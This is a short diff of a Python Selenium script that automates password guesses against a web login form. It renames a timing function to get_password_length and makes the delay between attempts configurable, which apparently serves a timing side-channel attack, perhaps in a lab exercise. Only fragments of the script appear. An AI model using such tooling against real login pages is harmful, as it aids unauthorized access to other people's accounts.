@@ -4,7 +4,7 @@ from selenium.webdriver.common.by import By
 import time
 
 
-def get_timing(username: str, webpage: str, max_tries: int) -> int:
+def get_password_length(username: str, webpage: str, max_tries: int, delay: float) -> int:
     # Ensure you have the correct path to your ChromeDriver executable
     chrome_driver_path = 'C:\Program Files\Google\Chrome\Application\chrome.exe'
 
@@ -26,7 +26,7 @@ def get_timing(username: str, webpage: str, max_tries: int) -> int:
 
         print("Trying password: " + password_guess)
         driver.find_element(By.CLASS_NAME, "btn-primary").click()
-        time.sleep(.5)
+        time.sleep(delay)
 
         response_message_element = driver.find_element(By.ID, "responseMessage")
         response_message_text = response_message_element.text
